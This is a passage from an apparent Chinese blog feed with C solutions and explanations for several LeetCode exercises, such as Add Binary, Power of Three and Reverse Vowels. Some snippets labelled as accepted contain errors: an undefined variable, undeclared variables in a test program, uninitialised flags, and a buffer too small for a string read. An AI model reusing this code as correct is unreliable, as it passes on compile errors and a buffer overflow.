class="line">    &#123;</div><div class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;m;j++)</div><div class="line">        &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>,s[i][j]);</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">rotate270</span><span class="params">(<span class="keyword">char</span>** s,<span class="keyword">int</span> n,<span class="keyword">int</span> m)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;m;i++)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;n;j++)</div><div class="line">        &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>,s[j][i]);</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> t,m,n,i,j,angle;</div><div class="line">    <span class="keyword">char</span> **s;   <span class="comment">//定义二维字符数组</span></div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;t);</div><div class="line">    <span class="keyword">while</span>(t--)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;n,&amp;m);</div><div class="line">        s = (<span class="keyword">char</span> **)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span> *)*n);  <span class="comment">//为二维数组动态分配内存</span></div><div class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</div><div class="line">        &#123;</div><div class="line">            s[i] = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*m);</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%s"</span>,s[i]);   <span class="comment">//输入字符串</span></div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;angle);</div><div class="line">        <span class="keyword">switch</span>(angle)&#123;</div><div class="line">            <span class="keyword">case</span> <span class="number">0</span>: rotate0(s,n,m);  <span class="keyword">break</span>;     <span class="comment">//旋转0度</span></div><div class="line">            <span class="keyword">case</span> <span class="number">90</span>: rotate90(s,n,m); <span class="keyword">break</span>;    <span class="comment">//旋转90度</span></div><div class="line">            <span class="keyword">case</span> <span class="number">180</span>: rotate180(s,n,m);  <span class="keyword">break</span>;     <span class="comment">//旋转180度</span></div><div class="line">            <span class="keyword">case</span> <span class="number">270</span>: rotate270(s,n,m);   <span class="keyword">break</span>;        <span class="comment">//旋转270度</span></div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Exercise</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>算法学习</tag>
      </tags>
  </entry>
  <entry>
    <title>算法学习-刷题(四)</title>
    <url>/2016/08/16/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E5%9B%9B/</url>
    <content><![CDATA[<h4 id="Add-Binary"><a href="#Add-Binary" class="headerlink" title="Add Binary"></a>Add Binary</h4><p>LeetCode第67题</p>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><p>Given two binary strings, return their sum (also a binary string).</p>
<a id="more"></a>
<p>For example,</p>
<p>a = “11”</p>
<p>b = “1”</p>
<p>Return “100”.</p>
<h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>一开始想到的方法是先将字符串转换成十进制数，再按十进制进行加处理，最后再将结果转换成二进制进行输出，然后试了好久一直超时，可能是效率太低了吧，一直都没有得到AC的结果。</p>
<p>最后，还是参考了一下别人的思路：字符串按位相加，先将两个字符串的相同部分从字符串尾部开始进行按位加操作，记录进位，并且加到下一位去，将加的结果存到另一个字符串中，再将长那一部分字符与上一步得到的进位进行按位加，同样将加的结果存在第三个字符串，如果最后还有进位，再把最后的进位加到字符串的尾部，但是最后得到的字符串并不是题目要求的结果，而是题目要求的结果的逆序字符串，所以还得进行字符串反转。</p>
<h5 id="LeetCode-AC的代码"><a href="#LeetCode-AC的代码" class="headerlink" title="LeetCode AC的代码"></a>LeetCode AC的代码</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">char</span>* <span class="title">addBinary</span><span class="params">(<span class="keyword">char</span>* a, <span class="keyword">char</span>* b)</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> len1,len2,len3,i,j,num,flag=<span class="number">0</span>;</div><div class="line">    <span class="keyword">char</span> *c,temp;</div><div class="line"></div><div class="line">    len1 = <span class="built_in">strlen</span>(a) - <span class="number">1</span>;</div><div class="line">    len2 = <span class="built_in">strlen</span>(b) - <span class="number">1</span>;</div><div class="line"></div><div class="line">    c = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">100</span>);   <span class="comment">//为结果字符串分配内存空间</span></div><div class="line"></div><div class="line">    i=<span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span>(len1&gt;=<span class="number">0</span>&amp;&amp;len2&gt;=<span class="number">0</span>)     <span class="comment">//从最低位开始将a字符串与b字符串等长的那一部分按位加</span></div><div class="line">    &#123;</div><div class="line">        num = (a[len1]-<span class="string">'0'</span>)+(b[len2]-<span class="string">'0'</span>)+flag;</div><div class="line">        flag = num/<span class="number">2</span>;   <span class="comment">//判断是否有进位</span></div><div class="line">        num = num%<span class="number">2</span>;    <span class="comment">//得到该位相加的结果</span></div><div class="line"></div><div class="line">        c[i] = (<span class="keyword">char</span>)(num+<span class="string">'0'</span>);     <span class="comment">//添加到结果字符串</span></div><div class="line"></div><div class="line">        len1--;     <span class="comment">//移动到下一次字符</span></div><div class="line">        len2--;     <span class="comment">//移动到下一次字符</span></div><div class="line">        i++;    </div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">while</span>(len1&gt;=<span class="number">0</span>)  <span class="comment">//如果a字符串比b长，则将a比b长的那一部分将入到结果字符串</span></div><div class="line">    &#123;</div><div class="line">        num = (a[len1]-<span class="string">'0'</span>)+flag;</div><div class="line">        flag = num/<span class="number">2</span>;</div><div class="line">        num = num%<span class="number">2</span>;</div><div class="line"></div><div class="line">        c[i] = (<span class="keyword">char</span>)(num+<span class="string">'0'</span>);</div><div class="line"></div><div class="line">        len1--;</div><div class="line">        len2--;</div><div class="line">        i++;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">while</span>(len2&gt;=<span class="number">0</span>)  <span class="comment">//如果b字符串比a长，则将b比a长的那一部分将入到结果字符串</span></div><div class="line">    &#123;</div><div class="line">        num = (b[len2]-<span class="string">'0'</span>)+flag;</div><div class="line">        flag = num/<span class="number">2</span>;</div><div class="line">        num = num%<span class="number">2</span>;</div><div class="line"></div><div class="line">        c[i] = (<span class="keyword">char</span>)(num+<span class="string">'0'</span>);</div><div class="line"></div><div class="line">        len1--;</div><div class="line">        len2--;</div><div class="line">        i++;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(flag&gt;<span class="number">0</span>)      <span class="comment">//处理最后的进位</span></div><div class="line">    &#123;</div><div class="line">        c[i] = (<span class="keyword">char</span>)(flag+<span class="string">'0'</span>);    </div><div class="line">        i++;</div><div class="line">    &#125;</div><div class="line">    c[i] = <span class="string">'\0'</span>;    <span class="comment">//添加字符串结束符</span></div><div class="line"></div><div class="line">    len3 = <span class="built_in">strlen</span>(c);</div><div class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;len3/<span class="number">2</span>;j++)   <span class="comment">//将结果字符串反转</span></div><div class="line">    &#123;</div><div class="line">        temp = c[j];</div><div class="line">        c[j] = c[len3<span class="number">-1</span>-j];</div><div class="line">        c[len3<span class="number">-1</span>-j] = temp;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> c;   <span class="comment">//返回结果字符串</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="Length-of-Last-Word"><a href="#Length-of-Last-Word" class="headerlink" title="Length of Last Word"></a>Length of Last Word</h4><p>LeetCode第58题</p>
<h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><p>Given a string s consists of upper/lower-case alphabets and empty space characters ‘ ‘, return the length of last word in the string.</p>
<p>If the last word does not exist, return 0.</p>
<p>Note: A word is defined as a character sequence consists of non-space characters only.</p>
<p>For example,<br>Given s = “Hello World”,<br>return 5.</p>
<h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>从头开始记录每个单词的长度，再判断空格的位置，空格之后还有单词则清空对前一个单词长度的记录，记录这个单词的长度，直到找到最后一个单词。</p>
<h5 id="LeetCode-AC的代码-1"><a href="#LeetCode-AC的代码-1" class="headerlink" title="LeetCode AC的代码"></a>LeetCode AC的代码</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">lengthOfLastWord</span><span class="params">(<span class="keyword">char</span>* s)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> i,j,count=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;s[i]!=<span class="string">'\0'</span>;i++)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>(<span class="built_in">isalpha</span>(s[i]))   <span class="comment">//判断是不是字母</span></div><div class="line">        &#123;</div><div class="line">            count++;    <span class="comment">//记录word长度</span></div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>(<span class="built_in">isspace</span>(s[i]))   <span class="comment">//如果是空格，则判断之后是否还有空格，如果有则不是最后的字符串，否则是最后的字符串</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">for</span>(j=i;a[j]!=<span class="string">'\0'</span>;j++)</div><div class="line">            &#123;</div><div class="line">                <span class="keyword">if</span>(<span class="built_in">isspace</span>(s[j]))   <span class="comment">//如果是连续的空格则继续下一个字符</span></div><div class="line">                    <span class="keyword">continue</span>;</div><div class="line">                <span class="keyword">else</span>    <span class="comment">//如果空格后还有字符，则进入下一次循环</span></div><div class="line">                    <span class="keyword">break</span>;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span>(s[j]!=<span class="string">'\0'</span>)  <span class="comment">//如果不是最后的word，则将计数清空</span></div><div class="line">                count=<span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> count;   <span class="comment">//返回word的长度</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="Power-of-Three"><a href="#Power-of-Three" class="headerlink" title="Power of Three"></a>Power of Three</h4><p>LeetCode第326题</p>
<h5 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h5><p>Given an integer, write a function to determine if it is a power of three.</p>
<p>Follow up:<br>Could you do it without using any loop / recursion?</p>
<h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><p>判断是否是3的次方，让这个数一直除以3，如果余数全为0，则可判定为3的指数。</p>
<h5 id="LeetCode-AC的代码-2"><a href="#LeetCode-AC的代码-2" class="headerlink" title="LeetCode AC的代码"></a>LeetCode AC的代码</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isPowerOfThree</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">0</span>)</div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    <span class="keyword">if</span>(n == <span class="number">1</span>)</div><div class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">    <span class="keyword">while</span>(n&gt;<span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>(n%<span class="number">3</span>)   <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//判断余数是不是0，是则继续下一步，否则判定为不是3的次方</span></div><div class="line">        n = n/<span class="number">3</span>;    <span class="comment">//得到商</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="Power-of-Four"><a href="#Power-of-Four" class="headerlink" title="Power of Four"></a>Power of Four</h4><p>LeetCode第342题</p>
<h5 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h5><p>Given an integer (signed 32 bits), write a function to check whether it is a power of 4.</p>
<p>Example:</p>
<p>Given num = 16, return true. Given num = 5, return false.</p>
<p>Follow up: Could you solve it without loops/recursion?</p>
<h5 id="思路分析-3"><a href="#思路分析-3" class="headerlink" title="思路分析"></a>思路分析</h5><p>此题与上一题思路一致。</p>
<h5 id="LeetCode-AC的代码-3"><a href="#LeetCode-AC的代码-3" class="headerlink" title="LeetCode AC的代码"></a>LeetCode AC的代码</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isPowerOfFour</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span>(num&lt;=<span class="number">0</span>)</div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    <span class="keyword">if</span>(num == <span class="number">1</span>)</div><div class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">    <span class="keyword">while</span>(num&gt;<span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>(num%<span class="number">4</span>)   <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">        num = num/<span class="number">4</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Exercise</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>算法学习</tag>
      </tags>
  </entry>
  <entry>
    <title>算法学习-刷题(三)</title>
    <url>/2016/08/14/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E4%B8%89/</url>
    <content><![CDATA[<h4 id="Power-of-Two"><a href="#Power-of-Two" class="headerlink" title="Power of Two"></a>Power of Two</h4><p>LeetCode第231题</p>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><p>Given an integer, write a function to determine if it is a power of two.</p>
<a id="more"></a>
<h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>i&amp;(i - 1)是用来判断一个数是否是2的指数的快捷方法，比如8，二进制位1000, 那么8&amp;(8-1)为0，只要&amp;的结果为0就是2的指数。</p>
<h5 id="leetcode-AC的代码"><a href="#leetcode-AC的代码" class="headerlink" title="leetcode AC的代码"></a>leetcode AC的代码</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isPowerOfTwo</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">0</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>(n&amp;(n<span class="number">-1</span>))</div><div class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">        <span class="keyword">else</span></div><div class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>提交上面的代码之后发现这个效率还是不太高啊，于是又到讨论区去学习了一下别人的思路，以下是一个相对高效的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isPowerOfTwo</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</div><div class="line">    <span class="comment">//int型最大32位，但是最大值取不到，所以最大的2的次方只能到0x40000000</span></div><div class="line">    <span class="keyword">int</span> ref = <span class="number">0x40000000</span>;   </div><div class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">0</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">while</span>( ref &gt; n)  ref &gt;&gt;= <span class="number">1</span>;     <span class="comment">//如果n比ref小，则ref移位直到ref小于n</span></div><div class="line">        <span class="comment">//ref始终是2的次方</span></div><div class="line">        <span class="keyword">return</span> ( n == ref ) ? <span class="literal">true</span> : <span class="literal">false</span>;     <span class="comment">//比较n与ref是否相等</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="Reverse-String"><a href="#Reverse-String" class="headerlink" title="Reverse String"></a>Reverse String</h4><p>LeetCode第344题</p>
<h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><p>Write a function that takes a string as input and returns the string reversed.</p>
<p>Example:</p>
<p>Given s = “hello”, return “olleh”.</p>
<h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>字符串反转，其实也是比较简单的一道题，最近在做考研数据结构的复习题，在线性表的课后习题中看到了类似的考题。基本思路就是字符互换。</p>
<h5 id="leetcode-AC的代码-1"><a href="#leetcode-AC的代码-1" class="headerlink" title="leetcode AC的代码"></a>leetcode AC的代码</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">char</span>* <span class="title">reverseString</span><span class="params">(<span class="keyword">char</span>* s)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> len,i;</div><div class="line">    <span class="keyword">char</span> temp;</div><div class="line">    len = <span class="built_in">strlen</span>(s);    <span class="comment">//获取字符串长度</span></div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len/<span class="number">2</span>;i++)    <span class="comment">//进行前半段字符与后半段字符的依次互换</span></div><div class="line">    &#123;</div><div class="line">        temp = s[i];</div><div class="line">        s[i] = s[len<span class="number">-1</span>-i];</div><div class="line">        s[len<span class="number">-1</span>-i] = temp;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> s;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这也是AC的代码，从字符串两端开始互换，运行起来比上一个要快一点点</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">char</span>* <span class="title">reverseString</span><span class="params">(<span class="keyword">char</span>* s)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> len,start,end;</div><div class="line">    <span class="keyword">char</span> temp;</div><div class="line">    len = <span class="built_in">strlen</span>(s);    <span class="comment">//获取字符串长度</span></div><div class="line">    start = <span class="number">0</span>;  <span class="comment">//字符串开始位置</span></div><div class="line">    end = len <span class="number">-1</span>;   <span class="comment">//字符串结束位置</span></div><div class="line">    <span class="keyword">while</span>(start&lt;end)    <span class="comment">//字符互换并移到下一个字符</span></div><div class="line">    &#123;</div><div class="line">        temp = s[start];</div><div class="line">        s[start] = s[end];</div><div class="line">        s[end] = temp;</div><div class="line">        start++;</div><div class="line">        end--;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> s;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="本地测试时的代码"><a href="#本地测试时的代码" class="headerlink" title="本地测试时的代码"></a>本地测试时的代码</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> *str;</div><div class="line">    str = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">100</span>);</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,str);</div><div class="line">    len = <span class="built_in">strlen</span>(str);</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len/<span class="number">2</span>;i++)</div><div class="line">    &#123;</div><div class="line">        temp = p[i];</div><div class="line">        p[i] = p[len<span class="number">-1</span>-i];</div><div class="line">        p[len<span class="number">-1</span>-i] = temp;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,p);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="Reverse-Vowels-of-a-String"><a href="#Reverse-Vowels-of-a-String" class="headerlink" title="Reverse Vowels of a String"></a>Reverse Vowels of a String</h4><p>LeetCode第345题</p>
<h5 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h5><p>Write a function that takes a string as input and reverse only the vowels of a string.</p>
<p>Example 1:</p>
<p>Given s = “hello”, return “holle”.</p>
<p>Example 2:</p>
<p>Given s = “leetcode”, return “leotcede”.</p>
<p>Note:<br>The vowels does not include the letter “y”.</p>
<h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><p>将字符串中的元音字母进行互换。从字符串的头尾两端进行扫描，发现元音字母就将标志位置为并停止移动，当两边都找到一个元音字母时就进行互换，再清空标志位，继续移位寻找。</p>
<h5 id="leetcode-AC的代码-2"><a href="#leetcode-AC的代码-2" class="headerlink" title="leetcode AC的代码"></a>leetcode AC的代码</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">char</span> <span class="title">isVowels</span><span class="params">(<span class="keyword">char</span> c)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">switch</span>(c)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">case</span> <span class="string">'a'</span>:</div><div class="line">        <span class="keyword">case</span> <span class="string">'o'</span>:</div><div class="line">        <span class="keyword">case</span> <span class="string">'e'</span>:</div><div class="line">        <span class="keyword">case</span> <span class="string">'i'</span>:</div><div class="line">        <span class="keyword">case</span> <span class="string">'u'</span>:</div><div class="line">        <span class="keyword">case</span> <span class="string">'A'</span>:</div><div class="line">        <span class="keyword">case</span> <span class="string">'O'</span>:</div><div class="line">        <span class="keyword">case</span> <span class="string">'E'</span>:</div><div class="line">        <span class="keyword">case</span> <span class="string">'I'</span>:</div><div class="line">        <span class="keyword">case</span> <span class="string">'U'</span>:</div><div class="line">            <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">        <span class="keyword">default</span>:</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">char</span>* <span class="title">reverseVowels</span><span class="params">(<span class="keyword">char</span>* s)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> len,start,end,start_flag,end_flag;</div><div class="line">    <span class="keyword">char</span> temp;</div><div class="line">    len = <span class="built_in">strlen</span>(s);</div><div class="line">    start = <span class="number">0</span>;</div><div class="line">    end = len - <span class="number">1</span>;</div><div class="line">    <span class="keyword">while</span>(start &lt; end)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>(isVowels(s[start]))</div><div class="line">            start_flag = <span class="number">1</span>; <span class="comment">//找到元音字母，则将标志位置为1，并停止移动</span></div><div class="line">        <span class="keyword">else</span></div><div class="line">            start++;</div><div class="line">        <span class="keyword">if</span>(isVowels(s[end]))</div><div class="line">            end_flag = <span class="number">1</span>;   <span class="comment">//找到元音字母，则将标志位置为1，并停止移动</span></div><div class="line">        <span class="keyword">else</span></div><div class="line">            end--;</div><div class="line">        <span class="keyword">if</span>((start_flag == <span class="number">1</span>)&amp;&amp;(end_flag == <span class="number">1</span>))  <span class="comment">//左右标志位均被置位时进行互换</span></div><div class="line">        &#123;</div><div class="line">            temp = s[start];</div><div class="line">            s[start] = s[end];</div><div class="line">            s[end] = temp;</div><div class="line">            start_flag = <span class="number">0</span>;     <span class="comment">//标志位清零</span></div><div class="line">            end_flag = <span class="number">0</span>;</div><div class="line">            start++;    <span class="comment">//继续移动</span></div><div class="line">            end--;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> s;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="本地测试的代码"><a href="#本地测试的代码" class="headerlink" title="本地测试的代码"></a>本地测试的代码</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">char</span> <span class="title">isVowels</span><span class="params">(<span class="keyword">char</span> c)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">switch</span>(c)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">case</span> <span class="string">'a'</span>:</div><div class="line">        <span class="keyword">case</span> <span class="string">'o'</span>:</div><div class="line">        <span class="keyword">case</span> <span class="string">'e'</span>:</div><div class="line">        <span class="keyword">case</span> <span class="string">'i'</span>:</div><div class="line">        <span class="keyword">case</span> <span class="string">'u'</span>:</div><div class="line">        <span class="keyword">case</span> <span class="string">'A'</span>:</div><div class="line">        <span class="keyword">case</span> <span class="string">'O'</span>:</div><div class="line">        <span class="keyword">case</span> <span class="string">'E'</span>:</div><div class="line">        <span class="keyword">case</span> <span class="string">'I'</span>:</div><div class="line">        <span class="keyword">case</span> <span class="string">'U'</span>:</div><div class="line">            <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">        <span class="keyword">default</span>:</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> len,start,end,start_flag,end_flag;</div><div class="line">    <span class="keyword">char</span> *str,temp;</div><div class="line">    str = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">100</span>);</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,str);</div><div class="line">    len = <span class="built_in">strlen</span>(str);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,len);</div><div class="line">    start = <span class="number">0</span>;</div><div class="line">    end = len - <span class="number">1</span>;</div><div class="line">    <span class="keyword">while</span>(start &lt; end)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>(isVowels(str[start]))</div><div class="line">            start_flag = <span class="number">1</span>;</div><div class="line">        <span class="keyword">else</span></div><div class="line">            start++;</div><div class="line">        <span class="keyword">if</span>(isVowels(str[end]))</div><div class="line">            end_flag = <span class="number">1</span>;</div><div class="line">        <span class="keyword">else</span></div><div class="line">            end--;</div><div class="line">        <span class="keyword">if</span>((start_flag == <span class="number">1</span>)&amp;&amp;(end_flag == <span class="number">1</span>))</div><div class="line">        &#123;</div><div class="line">            temp = str[start];</div><div class="line">            str[start] = str[end];</div><div class="line">            str[end] = temp;</div><div class="line">            start_flag = <span class="number">0</span>;</div><div class="line">            end_flag = <span class="number">0</span>;</div><div class="line">            start++;</div><div class="line">            end--;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,str);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Exercise</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>算法学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 网络请求框架 Android-async-http</title>
    <url>/2016/08/14/Android%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82%E6%A1%86%E6%9E%B6Android-async-http/</url>
